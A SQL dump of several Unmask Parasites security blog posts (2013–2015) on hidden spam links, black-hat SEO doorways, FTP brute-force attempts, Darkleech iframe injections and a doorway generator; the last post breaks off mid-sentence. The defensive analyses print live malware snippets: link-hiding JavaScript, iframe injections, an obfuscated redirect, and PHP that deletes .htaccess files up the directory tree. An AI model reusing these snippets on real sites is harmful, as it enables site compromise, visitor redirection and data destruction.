INSERT INTO `unmask` (`id`, `title`, `author`, `publishdate`, `content`, `tags`, `url`) VALUES (177, 'Reporting Suspicious Styles', 'unmask', '22 Nov 13', 'Loading site search ...          			                Reporting Suspicious Styles                          22 Nov 13   Filed in Unmask Parasites                Back in 2008, the very first task that I created Unmask Parasites for was scanning web pages for hidden links.I read an article about thousands of WordPress blogs being stuffed with dozens of invisible spammy links. I had a self-hosted WordPress blog too and that article made me think if there was some easy way to figure out whether my blog was hacked, something less laborious than manually examining the HTML code link by link. So I decided to create a tool that would show all domains that my web pages linked to highlighting those of them that had “invisible” styles. This approach has proved to be very efficient in identifying black hat SEO hacks. In most cases, a glance is enough to spot such problems.It works well even when the tool doesn’t highlight links as “hidden” (either because the “hiding rule” was not detected or because it scanned the “cloaked” page created specifically for search engines). You can still see the links that clearly don’t belong to your site, which tells you that something’s wrong.However, looking for suspicious links is not the bullet-proof method for detecting spam injection issues. For example, in my yesterday’s post on Sucuri blog, I wrote about fake WordPress plugins that used to injects spammy links and a JavaScript code into web pages. However, at the moment, they inject some hidden spammy auto-generated text that doesn’t have any links.You can use this Google query to reveal affected sites [cigarettes AND (“3200 unhealthy” OR “3300 hazardous”)]I don’t know why they do it, but webmasters should definitely be warned about such injections because it’s a sign of a problem that should be fixed as soon as possible. This is actually more serious than just a factor that can potentially affect site’s search ranking. Those fake plugins fetch the spammy content from remote servers and inject it into blog pages on the fly. This means that hackers can change it any time and the same moment the new spammy block will be injected into all compromised sites. Or it can be a malicious block, which makes things more serious as it will affect all visitors to those sites too.Unfortunately, such injections were not reported by Unmask Parasites since there were no links in the spammy block. After thinking about the problem, I decided that Unmask Parasites should also report pure HTML tricks such as that clip:rect style trick that hackers use to hide their injections.So , starting this week, you may see the “Suspicious Styles” section in Unmask Parasites reports.In this section, you will see excerpts of the style definitions that Unmask Parasites considers suspicious. If you see it in your site reports, then you should check the HTML code of your pages and figure out whether that style is a normal part of your pages or it was added there to hide something illicit.Note, if you can’t find such code in your web pages, it doesn’t mean it is not there. The code injection can be conditional, and server files may fetch it from a remote location (as in this case with fake WordPress plugins), or it can be encrypted. Just remember that Unmask Parasites works in real time (some results may be cached for up to an hour) and if it reports something, then you can be sure it was on a web page at the moment of scanning.To Unmask Parasites usersIf you like Unmask Parasites and want to help improve it, you can inform me about interesting tricks that hackers use to hide injected content Or send me examples of infected web pages where Unmask Parasites doesn’t report any problems.Thanks!Related posts:Unmasking “Canonical” HacksRich Snippets in Black Hat SEOIntroduction to Website Parasites                                                                                  Tags: black hat seo hidden links spam                                                    			                                            « Unmask Parasites joins Sucuri                Invasion of JCE Bots »            								Comments are closed.', '', 'http://blog.unmaskparasites.com/2013/11/22/reporting-suspicious-styles-2/\n');
INSERT INTO `unmask` (`id`, `title`, `author`, `publishdate`, `content`, `tags`, `url`) VALUES (178, 'Unmask Parasites joins Sucuri', 'unmask', '20 Sep 13', 'Loading site search ...          			                Unmask Parasites joins Sucuri                          20 Sep 13   Filed in Unmask Parasites                It’s official. This week Unmask Parasites joins Sucuri!Since July of 2008 when I released the first public version, Unmask Parasites was a “one man project” and it worked fine for me most of the time. I did everything myself from server setup to site development, from web attack investigations to blogging here. During these years Unmask Parasites became quite noticeable both within webmasters and Internet security community. And I always tried to meet their expectations providing a tool that could reveal various obscure website security issues and sharing information on how and why websites get hacked, and what can be done to prevent it.When Sucuri approached me and asked if I wanted to join their team as a malware researcher, I didn’t think much. I’ve been watching this company since 2010 and knew how much we had in common in our approach to Internet security. We both focus on helping site owners to detect security problems and protect their sites. We do our best to educate webmasters about things that hackers do with compromised websites — unmasking their dirty tricks is an important part of our work. In 2011 we established good relationship and began to help each other by sharing our information about ongoing massive attacks. Now Sucuri has grown to one of the leading companies in its field and makes a significant impact on how many thousands of site owners protect their sites. It’s an honor for me to join this company and the team of professionals that I know for so long time.I guess you wonder what will happen to Unmask Parasites scanner and this blog? They are here to stay! I will still be responsible for Unmask Parasites and continue to improve it and publish my blogposts here. Even better: now that I’m with Sucuri, I will have access to large volumes of data from their tools and support team (something that I really missed during the last five years), which will definitely facilitate my investigations, and, in turn, improve the quality of Unmask Parasites scanner and Sucuri own tools.For additional information check the Sucuri’s announcement.Let’s unmask parasites!Related posts:Let’s Unmask Parasites1 Million Pages Checked by Unmask Parasites!Unmask Parasites. A Year of Blogging.                                                                                  Tags: Sucuri                                                    			                                            « Analyzing [Buy Cialis] Search Results                Reporting Suspicious Styles »            			    Reader\'s Comments (2)       	        			        			Jackie McBride | 21 Sep 2013 3:36 pm 						Denis, I cannot think of anyone more deserving than you of this opportunity. Hearty congratulations & many blessings in your new venture as you go forward! & Sucuri better realize how damn lucky they are lol. From the sound of the announcement, it appears they do. Again, congratulations!                   			        			Sucuri Expands Research Efforts with Acquisition of Unmask Parasites | Sucuri Blog | 15 Sep 2014 11:50 pm 						[…] Unmask Parasites blog post […]', '', 'http://blog.unmaskparasites.com/2013/09/20/unmask-parasites-joins-sucuri/\n');
INSERT INTO `unmask` (`id`, `title`, `author`, `publishdate`, `content`, `tags`, `url`) VALUES (179, 'Analyzing [Buy Cialis] Search Results', 'unmask', '21 Aug 13', 'Loading site search ...          			                Analyzing [Buy Cialis] Search Results                          21 Aug 13   Filed in General                A few days ago I was updating the spammy word highlighting functionality  in Unmask Parasites results and needed to test the changes on real websites. To find hacked websites with spammy content I would normally google for [viagra] or [cialis], which are arguably the most targeted keywords used in black hat SEO hacks. However after the Google’s June update in how they rank web pages for spammy queries, I didn’t have much expectation of seeing hacked sites on the first page of search results for my usual [buy cialis] query and was ready to check a few more pages.We just started a new ranking update today for some spammy queries. See 2:30-3:10 of this video: http://t.co/KOMozoc3lo #smx— Matt Cutts (@mattcutts) June 11, 2013Indeed, for queries like [payday loans] I can see quite relevant results on the first three pages. All sites are specialized and don’t look like doorways on hacked sites. That’s really good. For [viagra] I found only one result on the first page pointing to a doorway on a hacked site. Still good.However, when I entered a really spammy combination [buy viagra], the search results were less than optimal — 5 out of 10 led to hacked sites. And at least 2 out of the rest 5 specialized sites were promoted using hidden links on hacked sites. Not good. And the worst results (although ideal for testing my update) were for the [buy cialis] query — 100% of results on the first page (10 out of 10) led to doorways on hacked sites or simply spammy web pages. Not a single result from websites that really have anything to do with cialis.Results analysisHere is the breakdown of the first 10 results (links go to real time Unmask Parasites reports for these pages and at the moment of writing they all reveal spammy content. However this may change over time):www.epmonthly .com/advertise/ — doorway on a hacked sitewerenotsorry .com/ — strange spammy site with a rubbish content like this “The car buy cialis in your car is the ultimate well source of electrical amazing power in your car.“incose .org/dom/ — doorway on a hacked site.www.deercrash .org/buy/cialis/online/ — doorway on a hacked sitejon-odell .com/?p=54 — doorway on a hacked sitewww.goodgrief .org .au/Cialis/ — doorway on a hacked sitewww.asm .wisc .edu/buy-cialis — doorway on a hacked sitewww.mhfa .com .au/cms/finance-home/ — doorway on a hacked sitewww .plowtoplate .org/library/51.html — doorway on a hacked sitejohn-leung .com/?p=16 — doorway on a hacked siteOver the course of the past week the results slightly fluctuated and sometimes I saw the following links on the first SERP.www.enconline .com/buycialisonline/ — doorway on a hacked sitewww.bbs-usa .com/online/ — doorway on a hacked sitewww.fabrand .com/buycialis/ — doorway on a hacked sitewww.philiptusa .com/streak/ — doorway on a hacked sitewww.clarkart.edu/authman/ — doorway on a hacked sitewww.gvhc.org/temp/index.html — doorway on a hacked sitewww.cialis-no-prescriptions.com — specialized site, but its backlink profile include many hacked sites with injected hidden links (e.g. www.aauw-nys.org)tadalafilcheap .ca/buy-cialis-online – another specialized site with a very poor backlink profile (mostly spammy off-topic forum posts).Out of 18 links that I encountered on the first page for [buy cialis] 15 point to doorways on hacked sites, 1 to a site with unreadable machine-generated text (still not sure whether it’s some SEO experiment or a backdoor with a tricky search traffic processing procedure) and 2 specialized sites relevant to the query but with quite bad backlink profiles. Overall 0% of results that follow Google’s quality guidelines.So the Google’s update for spammy queries doesn’t seem to work as it should at least for some über spammy queries.  It’s sad. And the reason why I’m sad is not that I worry about people who use such queries on Google to buy some counterfeit drugs.  My major concern is this situation justifies the huge number of sites (many thousands) that cyber-criminals hack in order to put a few of their doorways to the top for relevant queries on Google.Behind the scenesThe above 15 hacked sites that I found on the first Google’s SERP are actually only a tip of the iceberg. Each of them is being linked to from many thousands (if not millions) pages from similarly hacked sites. Here you can see a sample list of  sites that link to the above 15 (you might need a specialized tool like Unmask Parasites to see hidden and cloaked links there).Many of the hacked web pages link to more than one doorway page, which maximizes changes that one of them will be finally chosen by Google to be displayed on the first page for one of the many targeted keywords. And at the same time this helps to have a pool of alternative doorways in case some of them will be removed by webmasters or penalized by Google. As a result, the networks of doorways, landing pages and link pages can be very massive. Here you can see a list with just a small part of spammy links (338 unique domains) that can be found  on hacked web pages..gov, .edu and .orgAmong those hacked sites you can find sites of many reputable organizations, which most likely greatly help to rank well on Google. There are many compromised sites of professional associations, universities and even governmental sites, for example (as of August 19th, 2013):www.volunteer.gov/sec/spb.ca.gov/status/www.takepride.gov/index.htmlVolume of spammy backlinksIf you take some of the top results and check their backlink profiles (I used Majestic SEO Site Explorer), you’ll see how many domains can be compromised (or spammed) just in one black hat SEO campaign. And we know that there are many ongoing competing campaigns just for “cialis” search traffic, so you can imaging the overall impact.On the above screenshot you can see that thousands of domains linking to “www .epmonthly .com/advertise/” using various “cialis” keywords.The situation with “www. epmonthly .com/advertise/” is quite interesting. If you google for [“www.epmonthly .com/advertise/”] you’ll see more than a million results pointing to web pages where spammers used automated tools to post spammy links (including this one) in comments, profiles , etc. but failed to verify whether those sites accept the HTML code they were posting (still many sites, while escaping the HTML code, automatically make all URLs clickable, so those spammers finally achive their goal) .Typical black hat SEO tricksIn addition to annoying but pretty harmless comment spamming, forum spamming and creating fake user profiles, black hats massively hack websites with established reputation and turn them into their SEO assets.Spammy linksThe most common use for a hacked site is injecting links pointing to promoted resources (it can be a final landing page, or a doorway, or an intermediary site with links). Here is what such web pages may look like in Unmask Parasites reports:To hide such links from site owners, hackers make them hidden. For example, they can place them in an off-screen <div><div style=\"position:absolute; left:-8745px;\">...spammy links here...</div>Or put them in a normal <div> and add a JavaScript to make this <div> invisible when a browser loads the page<div id=\'hideMe\'> ... spammy links here.... </div><script type=\'text/javascript\'>if(document.getElementById(\'hideMe\') != null){document.getElementById(\'hideMe\').style.visibility = \'hidden\';document.getElementById(\'hideMe\').style.display = \'none\';}</script>The JavaScript can be encrypted.e v a l(function(p,a,c,k,e,d){e=function(c){return(c<a?\"\":e(parseInt(c/a)))+((c=c%a)>35?String.fromCharCode(c+29):c.toString(36))};if(!\'\'.replace(/^/,String)){while(c--)d[e(c)]=k[c]||e(c);k=[function(e){return d[e]}];e=function(){return\'\\\\w+\'};c=1;};while(c--)if(k[c])p=p.replace(new RegExp(\'\\\\b\'+e(c)+\'\\\\b\',\'g\'),k[c]);return p;}(\'2.1(\\\'0\\\').5.4=\"3\";\',6,6,\'bestlinks|getElementById|document|none|display|style\'.split(\'|\'),0,{}))which translates todocument.getElementById(\'bestlinks\').style.display=\"none\";where “bestlinks” is the id of the <div> with spammy links.Sometimes, encrypted JavaScript can be coupled with dynamic HTML generation of the link container. After decryption it looks like this:document.w ri t e(\'<style><!-- .read {display:none} --></style><address class=\"read\">\');...spammy links here...document.wri te(\'</address>\');Of course, it’s only a client-side representation of the problem. On the server side, it’s rarely this straightforward. Most times it involves obfuscated (usually PHP) code in sneaky places (e.g. themes, plugins, DB, etc.)DoorwaysSites that rely on black hat SEO techniques get penalized by Google soon enough so the can’t expect much search traffic directly from search engines. Instead they try to promote many disposable doorways on other reputable sites that would redirect search traffic to them.The typical approach is to hack a website and use cloaking tricks (generating a specialized version with spammy keywords specifically for search engines while leaving the original content for normal visitors) to make search engines think that its pages are relevant for those spammy queries. E.g. check the title of the “www.epmonthly .com/advertise/” when you visit it in a browser (“Advertise“) and when you check it in Unmask Parasites or in Google’s Cache (“Buy Cialis (Tadalafil) Online – OVERNIGHT Shipping“). Then they add some functionality to distinguish visitors coming from search engines and redirect them to third party sites that pay hackers for such traffic.The redirects may be implemented as .htaccess rules, client-side JavaScript code, or server-side PHP code.Sometimes, instead of using cloaking, hackers simply create a whole spammy section in a subdirectory of a legitimate site, or a standalone doorway page. Example from our cialis search results: www .asm .wisc .edu/buy-cialis .To WebmastersIt might be tricky to determine whether your site fell victim to a black hat SEO hack since hackers do their best to hide evidence from site owners and regular visitors. At the same time antivirus tools won’t help you here since links and redirects (in case they can actually see them) are not considered harmful. Nonetheless, a thoughtful webmaster is always equipped with proper tools and tricks (click here for details) to determine such issues.  They range from specialized Google search queries and and reports in Webmaster Tools to log analysis and server-side integrity control.In addition to the tricks that I described here, you can try to simply load your site with JavaScript turned off. Sometimes this is all it takes to find hidden links whose visibility is controlled by a script.Fighting black hat SEO hacksOf course, site owners are responsible for what happens with their sites, should protect them and clean them up in case of hacks. Doorways on hacked sites would never appear in search results if all webmasters would quickly mitigate such issues.But let’s take a look at this from a different perspective. The main goal of all black hat SEO hacks is to put their doorways to the top on Google for relevant keywords and get a targeted search traffic. And 80% (or even more) massive campaigns target a very narrow set of keywords and their modification. If Google actively monitor the first pages of search results for such keywords and penalize doorways, this could significantly reduce efficacy of such campaigns leaving very few incentive to hack website to put spammy links there. And you don’t have to monitor every possible keyword combination. In my experience, most of them will finally point to the same doorways.I can see Google moving in this direction. The description of the above mentioned ranking algorithm update is very promising. However, as the [buy cialis] query with 0% of relevant search results on the first page shows — a lot should be improved.P.S  Just before posting this article, I checked results for [buy cialis] once more and … surprise!.. found a link to a Wikipedia article about Tadalafil at the 4th position. Wow! Now we have 1 result that doesn’t seem to have anything to do with hacked sites.Related postsCloaking: Think Outside of [Your] BoxCareless Webmasters as WordPress Hosting Providers for Spammers“Cheap Vista” or Cloaked Spam on High-Profile SitesMatt Cutts on MalwareIntroduction to Website Parasites                                                                                  Tags: black hat seo cialis cloaking doorway google hidden links spam                                                    			                                            « FTP Brute Force Attacks?                Unmask Parasites joins Sucuri »            			    Reader\'s Comments (2)       	        			        			Colin | 29 Aug 2013 9:27 am 						Hi Dennis,Great analysis, very intersting.I actually contacted the support team at Volunteer.gov a couple of weeks ago, and they were able to remove the hacked pages they were hosted, as well as the other .govs. Great result, was happy at that :)They were hosting a pharma online store, which on investigation was apparently set up to facilitate credit card fraud.Cheers                   			        			Denis | 29 Aug 2013 4:28 pm 						Good!-1 spammy doorway on .gov.Hope Google will also take care of what it returns for certain spammy queries.', '', 'http://blog.unmaskparasites.com/2013/08/21/analyzing-buy-cialis-search-results/\n');
INSERT INTO `unmask` (`id`, `title`, `author`, `publishdate`, `content`, `tags`, `url`) VALUES (180, 'FTP Brute Force Attacks?', 'unmask', '26 Jun 13', 'Loading site search ...          			                FTP Brute Force Attacks?                          26 Jun 13   Filed in Website exploits                Hacking websites using FTP access has been one of the most popular attack vectors during the last few year. I can still see many massive site infections done via FTP.In most cases, the first step of such attacks is stealing FTP credentials from local computers of webmasters. Back in 2009, I described how PC malware stole passwords saved in popular FTP clients such as FileZilla, CuteFTP, SmartFTP and many more. This is still a prevailing vector. More exotic password theft methods include keyloggers, FTP traffic sniffing, and stealing user databases of hosting providers who prefer convenience over security and store actual client passwords in plain text or slightly encrypted (instead of storing only hashes of passwords).If you ask regular webmasters how hackers can break into their server via FTP, many of them will answer that hackers could guess the password (hence the need to have hard-to-guess passwords).  Of course, it is hard to guess whatever password at the first attempt, so one might expect to see multiple such attempts (so-called brute force attacks) before a password is cracked and hackers get access to a server. However in real life, I haven’t come across such FTP brute force attacks. Until this month…FTP log analysisI helped a webmaster of a hacked site and, as always, requested recent access and FTP logs to figure out how the site was hacked. The FTP logs clearly showed that someone used a valid username and passwords to upload infected files to the server. This happened several times a day (constant reinfections) from different IPs in different countries. Quite a typical picture.What was untypical were requests that looked like a brute force attack. They came from different IPs and each IP tried to login using many invalid usernames.Choice of usernames in brute force attacks.Here are just a few such sessions and the usernames they tried.198.50.144.128 (Canada		        Montreal		        Ovh Hosting Inc) – 165 login attempts within 70 seconds.second_level_domainsecond_level_domawebmasterwhere <second_level_domain> should be replaced with a real second level domain of a site. E.g. in case of “example.com” the second_level_domain will be example.This attack used the <domain name> as a username and webmaster as an alternative (supposedly default) username, and tried multiple popular passwords from some dictionary.46.29.255.84 (United States		        Lombard		        Deepak Mehta Fie) 	– 9 login attempts at a rate of 2 a second:second_level_domainsecond_level_domainsecond_level_domainsecond_level_domainftpsecond_level_domainrootsecond_level_domainadminsecond_level_domainuserIn this case, the attacker used domain name derivatives (appending words like ftp, admin, user) as usernames,  and the passwords probably matched the usernames (e.g. exampleftp/exampleftp).  A few times they re-tried the same usernames. Probably with slightly different passwords.110.85.113.113,  110.86.165.187, 117.26.118.189, 117.26.119.68 (all from China		        Fuzhou		        Chinanet Fujian Province Network) — 76 login attempts in less than 5 minutes from 4 IPs.00000011111111223312312332112345612345678123456789123654123abc1472581473692222223211233333334444445201314521521555555666666777777888888987654321999999abc123adminadmin111admin123admin222admin321admin333admin444admin555admin666admin777admin888admin999asd123asdasdsecond_level_domainsecond_level_domaintop_level_domaindata123qwe123qwertytestwebweb123wwwwww123zxc123zxcvbnDistributed attackThe last one was obviously a distributed brute force attack where bots from 4 different IPs worked simultaneously and in sync. E.g. one checked “111111” then another checked “112233“, then third checked “222222” and “333333“, then fourth checked “444444“, and so on. Most likely this attack also assumed that some sites may use the same words both as a username and a password.The above three attack took place within 26 hours. Each of them used different approach to choosing usernames and passwords, and they came from different parts of the Internet. It means that there is a real interest in FTP brute force attacks among cyber criminals.Why didn’t I come across such attacks before?After all, brute-force attacks on WordPress and Joomla admin interfaces proved to be very efficient. What makes them so efficient is the fact that there are many millions of WP and Joomla sites out there, and out of those millions there will always be enough sites whose admins were thoughtless enough to choose weak passwords.  That’s why I see hundreds or even thousands of login attempts per day in access logs of almost every WordPress and Joomla site I work with. And unfortunately, some of those site were hacked as a results of the brute force attacks.One might think that FTP is an even better target for brute force attacks since almost every site has FTP access so the number of victims with weak FTP passwords should be substantially larger than the number of WP an Joomla sites with crackable passwords. However it’s not that easy. You should not forget than in case of WP and Joomla, hackers assume that site administrators use the CMS default usernames (admin for WP and administrator for Joomla) so they only need to guess their passwords. But in case of FTP, the username is not known. There is no default FTP username. This is especially true for shared hosting environments where every client must use a unique username. So you need to guess both username and password in order to get access to a site, which dramatically reduces efficiency of brute force attacks (don’t forget the network latency of each FTP request which prevents from testing millions of variants per seconds that one might expect in a latency-free environment).In order to try the brute force approach, hackers need to narrow down their attack to the simplest cases and hope that the Internet is so big that even a tiny fraction of sites with hackable FTP credentials will worth the effort. And the Internet is really big (there are more than 100,000,000 .com domains alone) and to have better results one needs to attacks as many of them as possible, so the set of username/password pairs should be kept as tight as possible to provide results in reasonable time. Based on the above FTP log analysis, the current approach is to target: sites that use their domain name or some easy derivative from a domain name as a username along with a weak password. sites that use the same simple words for both usernames and passwords.Another reason why FTP brute-force attacks are not popular is the FTP logins can be tracked by server administrators who can, for example limit number of consecutive failed login attempts per IP address and then block the offending IPs (for example, using the fail2ban tool).I also guess that many server and client bots might simply lack the FTP brute force functionality…Do you have any better explanation?Why did I see the FTP brute force attacks on that particular site?I have two hypothesis:1. Massive FTP brute force attacks are in the proof of concept stage. A few years ago WordPress brute force attacks were quite rare too, but once criminals figured out that they could be very successful if you had enough resources to attack a large number of site, such attacks went mainstream. So maybe if FTP brute force attacks eventually prove to deliver good results, we’ll see a flood of login attempts in FTP logs of most sites (I hope not).2. In the beginning of the post, I forgot to mention about one more failed login attempt. It used the “anonymous” username and the 66.249.72.181 IP address. The thing is the IP address belongs to Google, more specifically to Googlebot. This means that there are some FTP links (e.g. ftp://example.com ) to that site on the web and Googlebot tries to crawl them using the default anonymous username which normally doesn’t require a password and is used for public FTP sites. Here is the explanation from John Mueller (Webmaster Trends Analyst at Google):When we find links to FTP content, we’ll generally attempt to crawl  those URLs. If they’re publicly accessible and return normal content, we  may choose to index them as well. While it’s not that common, there are  occasionally queries where a file on an FTP server is a good result.So my guess is such attacks may be limited to the sites that have direct FTP links to them on the web.Do you have any better explanation?Just in case. No, the original successful FTP hack that I investigated was not a result of a brute force attack. The username was not obvious and the  password was strong. The attackers used the tried-and-true credential  theft approach.To webmastersRegardless of the chances to see massive FTP brute force attacks in future, the described example should be considered as yet another lesson to all webmasters, who should realize all risks associated with FTP.Carefully choose both username and password.They should not be the sameThe username shoudn’t be easy to guess (e.g.  your site domain name is not the best choice)The password should be strong.Don’t save passwords in FTP programs. Configure them so that they ask for a password every time you connect to your site. If you work with multiple sites and/or don’t like the idea of memorizing many passwords, consider using password managers like KeePass or LastPass — they save your passwords much more securely.Consider using SFTP instead of FTP that sends your passwords in plain  text (they can be easily intercepted, for example, when you use public Wi-Fi). Most popular FTP  programs support SFTP, so the switch should be painless. If you  manage your own server, consider not installing an FTP server  altogether (or uninstalling it now if there are no others users who can’t use SFTP).If you manage a server, consider blocking multiple consecutive failed login attempts at a firewall level (tools like fail2ban may help). Moving FTP to a custom port may also help.Minimize risks of infecting your local computer (which brings you a step closer to password theft). Make sure that all software on your computer is up-to-date. This includes all OS  security updates, all browser updates and all browser plugin updates. Here you can check whether your browser is vulnerable:https://browsercheck.qualys.com/http://www.mozilla.org/en-US/plugincheck/Related posts:10 FTP Clients Malware Steals Credentials FromBeware: FileZilla Doesn’t Protect Your PasswordsWeak Passwords and Tainted WordPress WidgetsIntroduction to Website Parasites﻿                                                                                  Tags: brute-force FTP log analysis                                                    			                                            « Rotating Iframe URLs – One a Minute                Analyzing [Buy Cialis] Search Results »            								Comments are closed.', '', 'http://blog.unmaskparasites.com/2013/06/26/ftp-brute-force-attacks/\n');
INSERT INTO `unmask` (`id`, `title`, `author`, `publishdate`, `content`, `tags`, `url`) VALUES (181, '“Fancybox for WordPress Has Expired” Infection', 'unmask', '01 Apr 15', 'Loading site search ...          			                “Fancybox for WordPress Has Expired” Infection                          01 Apr 15   Filed in General, Short Attack Reviews, Website exploits                Today I began to notice quite a massive and very unusual attack that leverages vulnerabilities in older versions of the FancyBox for WordPress plugin.As you might know, versions 3.0.2 and older of this plugin allowed anyone to craft special POST requests to /wp-admin/admin-post.php or /wp-admin/admin-ajax.php and change values of specific plugin options in WordPress database. The plugin uses the modified options to build its own JavaScript code. As a result, the malicious content gets injected into generated WordPress pages.A typical malicious injection looks like this:Such attacks use the documented exploit code to inject malicious code into the “padding” value.The exploited vulnerability had been fixed on February 4th. Nonetheless, many blogs failed to update the plugin and hackers routinely find such blogs and infect them.The today’s attack also uses this exploit and modifies the “padding” value, but the code it injects cannot be called malicious:When visitors load such “infected” pages, they see this warning:WARNING: This version of the Fancybox for WordPress plugin has expired! Please upgrade to the latest version!And when they click on the “OK” button, they automatically get redirected to the Fancybox for WordPress changelog page in the official WordPress plugin repository.On one hand, this infection makes blogs unusable since it redirects visitors to WordPress plugin repository before they can read anything. On the other hand, it is very hard to ignore such a warning — if site owners want people to visit their sites they have to upgrade (or remove) the vulnerable version of the plugin ASAP.Now is the time to check if your blog shows such warnings. If you don’t see them, it’s not a reason to relax and wait for such a hard push to upgrade. Make sure all your themes and plugins are up-to-date now.                                                                                   Tags: April1 Fancybox WordPress                                                    			                                            « Darkleech Update – November 2014                            			    Reader\'s Comments (%)       	        			        			Pascal | 02 Apr 2015 8:43 am 						I’m a little suspicious because this article is tagged with “April1″ – though I don’t really see the sense in making this a hoax?', '', 'http://blog.unmaskparasites.com/2015/04/01/fancybox-for-wordpress-has-expired-infection/\n');
INSERT INTO `unmask` (`id`, `title`, `author`, `publishdate`, `content`, `tags`, `url`) VALUES (182, 'Darkleech Update – November 2014', 'unmask', '27 Nov 14', 'Loading site search ...          			                Darkleech Update – November 2014                          27 Nov 14   Filed in Short Attack Reviews, Website exploits                Just wanted to document some latest changes in Darkleech behavior that may help you detect it.I’d like to thank internet security enthusiasts who share their findings with me. Without you, I could have easily missed these new (?) details.Quick recapDarkleech is a root level server infection that installs malicious Apache modules. The modules inject invisible iframes into server response when it is already prepared (linebreaks added for readability).<style>.a4on6mz5h { position:absolute; left:-1376px; top:-1819px} </style> <div class=\"a4on6mz5h\"><ifr ame src=\"hxxp://tfmjst .hopto .org/nsiumkogckv1tv4locfzyv2eykqss9ltfb9wnmhfqz1ol2\" width=\"247\" height=\"557\"></ifram e></div>All the elements of this code are random and auto-generated on the fly (style name, coordinates, iframe diminsions, URL paths). Moreover, the iframe domains change every few minutes — lately hackers prefer free No-IP.com dynamic DNS hostnames like hopto.org, ddns.net, myftp.biz, myftp.org, serveftp.com, servepics.com, etc.This infection is hard to detect as it only shows up once per IP per day (or maybe even more seldom). And since it works on a low system level, it can detect if server admins are logged in, so it lurks until they log out — this means that they won’t see anything even if they monitor outgoing TCP traffic.For more details, please check the links at the bottom of this post.What’s new?IE=EmulateIE9Recently, I’ve been pointed at the fact that now Darkleech also adds the following meta tag setting IE 9 compatibility mode in Internet Explorer. It looks like it searches for the </head> tag and replaces it with the following code (again, linebreaks added for readability):<meta http-equiv=\'x-ua-compatible\' content=\'IE=EmulateIE9\'></head><style>.syxq9la69 { position:absolute; left:-1666px; top:-1634px} </style> <div class=\"syxq9la69\"><iframe src=\"hxxp://jsnrgo .ddns .net/nsiumkogckv1tv4locfzyv2eykqss9ltfb9wnmhfqz1ol2\" width=\"285\" height=\"554\"></iframe></div>This IE=EmulateIE9 instruction tells modern versions of Internet Explorer to render a web page as if they were IE 9, using all the features that has been deprecated in IE 10 and newer versions of IE. Some of the legacy features are known to have vulnerabilities and hackers try to exploit them turning the compatibility mode on (e.g. VML-related exploit)_SESSION_ID cookieIn addition to temporary IP blacklisting, Darkleech also uses the _SESSION_ID cookie that expires in one week. It adds the following cookie into response headers:Set-Cookie: _SESSION_ID=-1; expires=Wed 03-Dec-2014 09:32:48 GMT; path=/So even if you change your IP address (e.g. if you have a dynamic IP address) you still won’t see malware for the following 7 days. So don’t forget to clear/block cookies if you are trying to reproduce infected response.Most likely the IP blacklisting also works for one week now too.Just a couple of more things:As you might have figured out, it looks for Internet Explorer User-Agent (and derivatives like Maxthon, Avant).Referer is not important at the moment. I managed to trigger it even without the Referer header.That’s it for today. Please let me know if you have some other news about Darkleech.Previous posts about Darkleech:Malicious Apache Module Injects IframesRFI: Server-wide iframe injectionsWorking With the Darkleech Bitly DataDarkleech + Bitly.com = Insightful Statistics (Sucuri blog)Server Compromises – Understanding Apache Module iFrame Injections and Secure Shell Backdoor (Sucuri blog)                                                                                   Tags: Apache Darkleech EmulateIE9 No-IP                                                    			                                            « Most Contradictive Doorway Generator                “Fancybox for WordPress Has Expired” Infection »            			    Reader\'s Comments (2)       	        			        			WordPress Malware Causes Psuedo-Darkleech Infection | Sucuri Blog | 26 Mar 2015 4:25 pm 						[…] and this is the code from November of 2014 […]                   			        			WordPress Malware Causas Psuedo-Darkleech Infección | Sucuri Español | 13 Apr 2015 10:41 pm 						[…] y este es el código de noviembre de 2014: […]', '', 'http://blog.unmaskparasites.com/2014/11/27/darkleech-update-november-2014/\n');
INSERT INTO `unmask` (`id`, `title`, `author`, `publishdate`, `content`, `tags`, `url`) VALUES (183, 'Most Contradictive Doorway Generator', 'unmask', '12 Sep 14', 'Loading site search ...          			                Most Contradictive Doorway Generator                          12 Sep 14   Filed in Short Attack Reviews                Check this thread on WordPress.org forum. The topic starter found a suspicious PHP file and asked what it was doing.The code analysis shows that it’s some sort of a spammy doorway. But it’s a very strange doorway and the way that it works doesn’t make sense to me.First of all, this script has a random text and code generator. The output it generates is [kind of] always unique. Here is a couple of output pages:http://pastebin.com/ymwMZMWPhttp://pastebin.com/Y6B7WM2T...<title>Is. Last spots brows: Dwelling. Immediately moral.</title></head><body>listend40721<span>Flowerill merry chimes - has: Her - again spirits they, wooers. Delight preserve. For he. Free - snow set - grave lapped, icecold made myself visitings allow, beeves twas. Now one:...We usually see such a random text, when spammers want search engines to index “unique” content with “right” keywords. But…1. the script returns the page with the 404 not found code.header(\"HTTP/1.1 404 Not Found\");so the page won’t be indexed by search engines.2. The obfuscated JavaScript code at the bottom of the generated page redirects to a pharma site after about a second.function falselye() { falselya=29; falselyb=[148,134,139,129,140,148,75,145,140,141,75,137,140,128,126,145,134,140,139,75,133,143,130,131,90,68,133,145,145,141,87,76,76,145,126,127,137,130,145,138,130,129,134,128,126,143,130,144,75,130,146,68,88];falselyc=\"\"; for(falselyd=0;falselyd<falselyb.length;falselyd++) { falselyc+=String.fromCharCode(falselyb[falselyd]-falselya); } return falselyc; } setTim eout(falselye(),1263);decodedwindow.top.location.href=\'hxxp://tabletmedicares .eu\';Update: on another site the script redirected to hxxp://uanlwkis .com (also pharma site), which was registered only a few days ago on Sept 6th, 2014.But the generated text has no pharma keywords. One more hint that it’s not for search engines. Maybe it’s an intermediary landing page of some email spam campaign that just needs to redirect visitors? I saw many such landing pages on hacked sites. But it most cases they looked like the decoded version of the script — just a redirection code. Indeed why bother with sophisticated random page generator if no one (neither humans nor robots) is going to read it?3. There is also this strange piece of code:$s=\'/\';if (strtolower(substr(PHP_OS,0,3))==\'win\') $s=\"\\\\\\\\\";$d=array(\".$s\");$p=\"\";for($i=1; $i<255; $i++){$p.=\"..$s\";if (is_dir($p)){array_push($d,$p);}else{break;}}foreach($d as $p){$a=\"h\".\"tac\".\"c\".\"es\".\"s\";$a1=$p.\".$a\";$a2=$p.$a;$a3=$p.\"$a.txt\";@chmod($a1,0666);@unlink($a1);@chmod($a2,0666);@unlink($a2);@chmod($a3,0666);@unlink($a3);}What it does it tries to find an delete(!) all file with names .htaccess, htaccess and htaccess.txt in the current directory and all(!) the directories above the current.That just doesn’t make sense. Why is it trying to corrupt websites? I would understand if it only removed its own files and injected code in legitimate files, but it tries to just remove every .htaccess (and its typical backups) without checking what’s inside. That’s a really 